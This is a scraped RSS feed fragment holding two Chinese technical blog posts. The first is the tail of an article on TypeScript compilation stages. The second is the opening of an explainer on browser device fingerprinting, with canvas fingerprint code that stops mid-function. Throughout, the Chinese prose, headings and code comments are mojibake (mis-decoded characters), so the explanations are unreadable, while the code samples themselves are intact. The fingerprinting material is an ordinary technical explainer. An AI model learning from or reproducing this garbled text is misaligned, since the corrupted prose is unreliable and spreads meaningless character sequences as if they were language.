<span class="hljs-keyword">const</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> error = str + num; 
<span class="hljs-comment">// âš ï¸ TypeScriptä¼šè­¦å‘Šï¼šè™½ç„¶èƒ½è¿è¡Œï¼Œä½†å¯èƒ½æ˜¯é€»è¾‘é”™è¯¯</span>
</code></pre>
<h3 data-id="heading-8">é˜¶æ®µä¸‰ï¼šä»£ç è½¬æ¢ä¸ç”Ÿæˆ</h3>
<h4 data-id="heading-9">æ­¥éª¤5ï¼šç±»å‹æ“¦é™¤ï¼ˆType Erasureï¼‰</h4>
<p>è¿™æ˜¯TypeScriptè®¾è®¡å“²å­¦çš„å…³é”®ä½“ç°â€”â€”æ‰€æœ‰ç±»å‹ä¿¡æ¯åœ¨è¿è¡Œæ—¶éƒ½ä¸å­˜åœ¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¼–è¯‘å‰ (.ts)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
    age?: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">user: User</span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${user.name}</span>!`</span>;
}

<span class="hljs-comment">// ç¼–è¯‘å (.js)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">user</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello, "</span> + user.<span class="hljs-property">name</span> + <span class="hljs-string">"!"</span>;
}
<span class="hljs-comment">// æ³¨æ„ï¼šUseræ¥å£å®Œå…¨æ¶ˆå¤±äº†ï¼</span>
</code></pre>
<h4 data-id="heading-10">æ­¥éª¤6ï¼šé™çº§è½¬æ¢ï¼ˆDownlevelingï¼‰</h4>
<p>æ ¹æ®tsconfig.jsonä¸­çš„targeté…ç½®ï¼Œå°†ç°ä»£JavaScriptè¯­æ³•è½¬æ¢ä¸ºç›®æ ‡ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¼–è¯‘å‰ï¼ˆES2022ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    #privateField = <span class="hljs-string">"secret"</span>; <span class="hljs-comment">// ç§æœ‰å­—æ®µ</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api'</span>);
        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
    }
}

<span class="hljs-comment">// ç¼–è¯‘ä¸ºES5ï¼ˆtarget: "es5"ï¼‰</span>
<span class="hljs-keyword">var</span> <span class="hljs-title class_">User</span> = <span class="hljs-comment">/** <span class="hljs-doctag">@class</span> */</span> (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params"/>) {
        _privateField.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">"secret"</span>);
    }
    <span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">fetchData</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">__awaiter</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>, <span class="hljs-built_in">void</span> <span class="hljs-number">0</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
            <span class="hljs-keyword">var</span> response;
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">__generator</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">_a</span>) {
                <span class="hljs-comment">// å¤æ‚çš„è½¬è¯‘ä»£ç ...</span>
            });
        });
    };
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">User</span>;
}());
<span class="hljs-keyword">var</span> _privateField = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
</code></pre>
<h4 data-id="heading-11">æ­¥éª¤7ï¼šä»£ç ç”Ÿæˆä¸è¾“å‡º</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># tscçš„å®Œæ•´å·¥ä½œæµç¨‹</span>
è¾“å…¥: src/
â”œâ”€â”€ index.ts        <span class="hljs-comment"># TypeScriptæºç </span>
â”œâ”€â”€ utils.ts
â””â”€â”€ types.ts

å¤„ç†: tscç¼–è¯‘å™¨
â”œâ”€â”€ è§£ææ‰€æœ‰æ–‡ä»¶
â”œâ”€â”€ æ„å»ºé¡¹ç›®å¼•ç”¨å›¾
â”œâ”€â”€ ç±»å‹æ£€æŸ¥
â”œâ”€â”€ è½¬æ¢ä»£ç 
â””â”€â”€ ç”Ÿæˆè¾“å‡º

è¾“å‡º: dist/
â”œâ”€â”€ index.js        <span class="hljs-comment"># JavaScriptä»£ç </span>
â”œâ”€â”€ utils.js
â”œâ”€â”€ index.d.ts      <span class="hljs-comment"># ç±»å‹å£°æ˜æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰</span>
â””â”€â”€ index.js.map    <span class="hljs-comment"># Source Mapï¼ˆå¯é€‰ï¼‰</span>
</code></pre>
<h2 data-id="heading-12">ç±»å‹æ£€æŸ¥ vs ä»£ç ç”Ÿæˆçš„å…³ç³»</h2>
<h3 data-id="heading-13">åˆ†ç¦»ä½†åä½œçš„ä¸¤ä¸ªç³»ç»Ÿ</h3>
<p>TypeScriptç¼–è¯‘å™¨å†…éƒ¨å®é™…ä¸Šæœ‰ä¸¤ä¸ªç›¸å¯¹ç‹¬ç«‹çš„å­ç³»ç»Ÿï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ¦‚å¿µæ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeScriptCompiler</span> {
    <span class="hljs-comment">// ç±»å‹æ£€æŸ¥å™¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">typeChecker</span>: <span class="hljs-title class_">TypeChecker</span>;
    
    <span class="hljs-comment">// ä»£ç ç”Ÿæˆå™¨ï¼ˆåŸºäºJavaScriptç¼–è¯‘å™¨ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">emitter</span>: <span class="hljs-title class_">Emitter</span>;
    
    <span class="hljs-title function_">compile</span>(<span class="hljs-attr">sourceFile</span>: <span class="hljs-title class_">SourceFile</span>): <span class="hljs-title class_">OutputFile</span>[] {
        <span class="hljs-comment">// 1. ç±»å‹æ£€æŸ¥ï¼ˆå¯èƒ½å¤±è´¥ï¼Œä½†ä¸å½±å“ç»§ç»­ï¼‰</span>
        <span class="hljs-keyword">const</span> diagnostics = <span class="hljs-variable language_">this</span>.<span class="hljs-property">typeChecker</span>.<span class="hljs-title function_">check</span>(sourceFile);
        
        <span class="hljs-comment">// 2. æŠ¥å‘Šé”™è¯¯ï¼ˆä½†ä¸åœæ­¢ï¼‰</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reportDiagnostics</span>(diagnostics);
        
        <span class="hljs-comment">// 3. ä»£ç ç”Ÿæˆï¼ˆæ— è®ºæ˜¯å¦æœ‰ç±»å‹é”™è¯¯ï¼‰</span>
        <span class="hljs-keyword">const</span> jsCode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">emitter</span>.<span class="hljs-title function_">emit</span>(sourceFile);
        
        <span class="hljs-keyword">return</span> [jsCode];
    }
}
</code></pre>
<h3 data-id="heading-14">å…³é”®ç‰¹æ€§ï¼šæ¸è¿›å¼æ£€æŸ¥</h3>
<p>TypeScripté‡‡ç”¨æ¸è¿›å¼ç±»å‹æ£€æŸ¥ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–‡ä»¶A.ts - å…ˆç¼–è¯‘è¿™ä¸ª</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// æ–‡ä»¶B.ts - åç¼–è¯‘ï¼Œä¾èµ–äºA.ts</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./A'</span>;

<span class="hljs-comment">// å³ä½¿A.tsæœ‰ç±»å‹é”™è¯¯ï¼ŒB.tsä»ç„¶å¯ä»¥ï¼š</span>
<span class="hljs-comment">// 1. è·å¾—A.tsçš„ç±»å‹ä¿¡æ¯ï¼ˆå¯èƒ½ä¸å®Œæ•´ï¼‰</span>
<span class="hljs-comment">// 2. æ£€æŸ¥è‡ªèº«ä»£ç çš„ç±»å‹æ­£ç¡®æ€§</span>
<span class="hljs-comment">// 3. ç”ŸæˆJavaScriptä»£ç </span>
<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-string">"10"</span>); <span class="hljs-comment">// âŒ è¿™é‡Œä¼šæŠ¥é”™</span>
</code></pre>
<h2 data-id="heading-15">ä¸ºä»€ä¹ˆæœ‰äº›ç±»å‹é”™è¯¯ä¸å½±å“è¿è¡Œï¼Ÿ</h2>
<h3 data-id="heading-16">æ¡ˆä¾‹ä¸€ï¼šç±»å‹ç³»ç»Ÿæ— æ³•æ•è·çš„è¿è¡Œæ—¶é”™è¯¯</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptç¼–è¯‘æ—¶æ£€æŸ¥é€šè¿‡ âœ…</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a / b;
}

<span class="hljs-comment">// è¿è¡Œæ—¶å¯èƒ½å‡ºé”™ âŒ</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">divide</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// Infinityï¼Œå¯èƒ½ä¸æ˜¯æœŸæœ›çš„ç»“æœ</span>
<span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"nonexistent"</span>);
element.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// Runtime Error: Cannot read property...</span>
</code></pre>
<h3 data-id="heading-17">æ¡ˆä¾‹äºŒï¼šç±»å‹æ–­è¨€ç»•è¿‡æ£€æŸ¥</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">SafeData</span> {
    <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç¼–è¯‘æ—¶ï¼šæ¬ºéª—TypeScript</span>
<span class="hljs-keyword">const</span> unsafeData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"value": 123}'</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">SafeData</span>;

<span class="hljs-comment">// è¿è¡Œæ—¶ï¼šæ²¡æœ‰é—®é¢˜...æš‚æ—¶</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(unsafeData.<span class="hljs-property">value</span>); <span class="hljs-comment">// 123 (number, ä¸æ˜¯string!)</span>

<span class="hljs-comment">// ç›´åˆ°è¿™é‡Œæ‰å¯èƒ½å‡ºé”™</span>
<span class="hljs-keyword">const</span> length = unsafeData.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>; <span class="hljs-comment">// Runtime Error!</span>
</code></pre>
<h3 data-id="heading-18">æ¡ˆä¾‹ä¸‰ï¼šå¤–éƒ¨JavaScriptåº“</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å‡è®¾ä½¿ç”¨äº†ä¸€ä¸ªæ²¡æœ‰ç±»å‹å®šä¹‰çš„ç¬¬ä¸‰æ–¹åº“</span>
<span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">legacyLib</span>: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// ä½¿ç”¨anyç±»å‹</span>

<span class="hljs-keyword">const</span> result = legacyLib.<span class="hljs-title function_">calculate</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
<span class="hljs-comment">// TypeScript: âœ… æ²¡æœ‰ç±»å‹é”™è¯¯ï¼ˆå› ä¸ºanyï¼‰</span>
<span class="hljs-comment">// è¿è¡Œæ—¶: å¯èƒ½æˆåŠŸï¼Œä¹Ÿå¯èƒ½å´©æºƒ</span>
</code></pre>
<h2 data-id="heading-19">ç»“è¯­</h2>
<p>æœ¬æ–‡ä»‹ç»äº†TypeScriptçš„æ ¸å¿ƒå·¥ä½œæµç¨‹ï¼Œå¯¹äºæ–‡ç« ä¸­é”™è¯¯çš„åœ°æ–¹æˆ–è€…æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æŒ‡çº¹æŠ€æœ¯æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿï¼ˆCanvasã€Audioã€ç¡¬ä»¶API æ ¸å¿ƒåŸç†è§£å¯†ï¼‰]]></title>    <link>https://juejin.cn/post/7596970073750552612</link>    <guid>https://juejin.cn/post/7596970073750552612</guid>    <pubDate>2026-01-20T03:02:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596970073750552612" data-draft-id="7596969908325580854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æŒ‡çº¹æŠ€æœ¯æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿï¼ˆCanvasã€Audioã€ç¡¬ä»¶API æ ¸å¿ƒåŸç†è§£å¯†ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-20T03:02:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æŒ‡çº¹æŠ€æœ¯æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿï¼ˆCanvasã€Audioã€ç¡¬ä»¶API æ ¸å¿ƒåŸç†è§£å¯†ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:02:21.000Z" title="Tue Jan 20 2026 03:02:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/417e0311f90b43e298db5fab3f7dbcbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=ZG6XdKS5GaPQ1OOE6wNe2d32cv8%3D" alt="Fingerprint-KYS-01-1-1200x596.png" loading="lazy"/></p>
<h3 data-id="heading-0">ä»€ä¹ˆæ˜¯è®¾å¤‡æŒ‡çº¹ï¼Ÿ</h3>
<p>åœ¨è®²å®ç°ä¹‹å‰ï¼Œå…ˆçº æ­£ä¸€ä¸ªè¯¯åŒºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2F%25E8%25A3%259D%25E7%25BD%25AE%25E6%258C%2587%25E7%25B4%258B" target="_blank" title="https://zh.wikipedia.org/wiki/%E8%A3%9D%E7%BD%AE%E6%8C%87%E7%B4%8B" ref="nofollow noopener noreferrer">è®¾å¤‡æŒ‡çº¹ï¼ˆDevice Fingerprintï¼‰</a>ä¸æ˜¯ä¸ºäº†çŸ¥é“<strong>ä½ æ˜¯å¼ ä¸‰</strong>ï¼Œè€Œæ˜¯ä¸ºäº†çŸ¥é“ <strong>è¿™å°è®¾å¤‡æ˜¯ç¼–å· 9527</strong>ã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒé€»è¾‘åªæœ‰ä¸€æ¡ï¼š<strong>åˆ©ç”¨æµè§ˆå™¨æš´éœ²çš„ç¡¬ä»¶åº•å±‚å·®å¼‚ï¼ˆæ˜¾å¡ã€å£°å¡ã€ç”µæ± ã€å±å¹•ï¼‰ï¼Œç»„åˆå‡ºæé«˜ç†µå€¼çš„å”¯ä¸€ IDã€‚</strong></p>
<p>å°±ç®—ä½ æ¸…ç©ºäº† Cookieï¼Œæ¢äº† IPï¼Œåªè¦ä½ çš„ç¡¬ä»¶æ²¡å˜ï¼Œè¿™å¥—ä»£ç ç®—å‡ºæ¥çš„ Hash å€¼å°±æ°¸è¿œä¸å˜ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç›´æ¥ä¸Šä»£ç ï¼Œæ‹†è§£æœ€æ ¸å¿ƒçš„ä¸‰ç§å®ç°æ–¹å¼ã€‚</p>
<hr/>
<h3 data-id="heading-1">Canvas æŒ‡çº¹</h3>
<p>è¿™æ˜¯ç›®å‰æœ€æˆç†Ÿã€è¯†åˆ«ç‡æœ€é«˜çš„æŠ€æœ¯ã€‚</p>
<h4 data-id="heading-2">å®ç°åŸç†</h4>
<p>Canvas ç»˜å›¾ä¸ä»…ä»…ä¾èµ–æµè§ˆå™¨å¼•æ“ï¼Œå®ƒæåº¦ä¾èµ–åº•å±‚çš„ <strong>GPU ç»˜å›¾æŒ‡ä»¤</strong>ã€<strong>æ“ä½œç³»ç»Ÿå›¾å½¢é©±åŠ¨</strong> ä»¥åŠ <strong>æŠ—é”¯é½¿ï¼ˆAnti-aliasingï¼‰ç®—æ³•</strong>ã€‚</p>
<p>å½“ä½ å‘½ä»¤æµè§ˆå™¨<strong>ç”»ä¸€ä¸ªçº¢è‰²çš„çŸ©å½¢ï¼Œé‡Œé¢å†™ä¸Š Hello, world!</strong> æ—¶ï¼š</p>
<ul>
<li>NVIDIA çš„æ˜¾å¡å’Œ AMD çš„æ˜¾å¡ï¼Œåœ¨å¤„ç†è¾¹ç¼˜åƒç´ çš„æ··åˆï¼ˆæŠ—é”¯é½¿ï¼‰æ—¶ï¼Œç®—æ³•æœ‰å¾®å°çš„æ•°å­¦å·®å¼‚ã€‚</li>
<li>Windows å’Œ Mac åœ¨å­—ä½“æ¸²æŸ“ï¼ˆSub-pixel renderingï¼‰ä¸Šï¼Œå¯¹ç¬”ç”»ç²—ç»†çš„å¤„ç†ä¸åŒã€‚</li>
<li>è¿™å°±å¯¼è‡´äº†ï¼š<strong>åŒä¸€æ®µ Canvas ä»£ç ï¼Œç”Ÿæˆçš„å›¾ç‰‡åƒç´ æ•°æ®ï¼ˆRGBAï¼‰ï¼Œåœ¨ä¸åŒè®¾å¤‡ä¸Šæ˜¯å®Œå…¨ä¸åŒçš„ã€‚</strong></li>
</ul>
<h4 data-id="heading-3">æ ¸å¿ƒä»£ç å®ç°æ–¹å¼</h4>
<p>æˆ‘ä»¬ä¸éœ€è¦ç”»å¤šå¤æ‚çš„å›¾ï¼Œå…³é”®æ˜¯è¦<strong>è§¦å‘å·®å¼‚</strong>ã€‚é€šå¸¸ä¼šç”¨åˆ°ï¼šå…‰å½±å åŠ ã€å¼‚å½¢å­—ä½“ã€emojiï¼ˆæ£€æµ‹å­—ä½“åº“ï¼‰ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCanvasFingerprint</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. åˆ›å»ºä¸€ä¸ªä¸ä¼šæŒ‚è½½åˆ° DOM ä¸Šçš„ç”»å¸ƒ</span>
    <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'canvas'</span>);
    <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
    canvas.<span class="hljs-property">width</span> = <span class="hljs-number">200</span>;
    canvas.<span class="hljs-property">height</span> = <span class="hljs-number">50</span>;

    <span class="hljs-comment">// 2. æ–‡å­—å¹²æ‰°ï¼šåˆ©ç”¨å­—ä½“æ¸²æŸ“å·®å¼‚</span>
    <span class="hljs-comment">// textBaseline è®¾ä¸º top/bottom ä¼šè§¦å‘ä¸åŒçš„å‚ç›´å¯¹é½ç®—æ³•</span>
    ctx.<span class="hljs-property">textBaseline</span> = <span class="hljs-string">"top"</span>;
    ctx.<span class="hljs-property">font</span> = <span class="hljs-string">"14px 'Arial'"</span>;
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"#f60"</span>;
    ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">125</span>, <span class="hljs-number">1</span>, <span class="hljs-number">62</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// èƒŒæ™¯å—</span>

    <span class="hljs-comment">// 3. å åŠ æ··åˆï¼šè§¦å‘ GPU çš„é¢œè‰²æ··åˆç®—æ³•</span>
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"#069"</span>;
    <span class="hljs-comment">// å†™å…¥å¸¦ç‰¹æ®Šç¬¦å·çš„æ–‡å­—ï¼Œæµ‹è¯•ç³»ç»Ÿå­—ä½“æ”¯æŒåº¦</span>
    ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">"Hello, world! \ud83d\ude03"</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>);
    
    <span class="hljs-comment">// å†æ¬¡å åŠ ï¼Œåˆ©ç”¨ rgba é€æ˜åº¦è§¦å‘æŠ—é”¯é½¿å·®å¼‚</span>
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">"rgba(102, 204, 0, 0.7)"</span>;
    ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">"Hello, world! \ud83d\ude03"</span>, <span class="hljs-number">4</span>, <span class="hljs-number">17</span>);

    <span class="hljs-comment">// 4. å¯¼å‡ºæŒ‡çº¹</span>
    <span class="hljs-comment">// toDataURL ä¼šè¿”å› base64 å­—ç¬¦ä¸²</span>
    <span class="hljs-comment">// åŒæ ·çš„å›¾åƒï¼Œä¸åŒæ˜¾å¡ç”Ÿæˆçš„ base64 å­—ç¬¦ä¸²çš„ CRC æ ¡éªŒç æ˜¯ä¸åŒçš„</span>
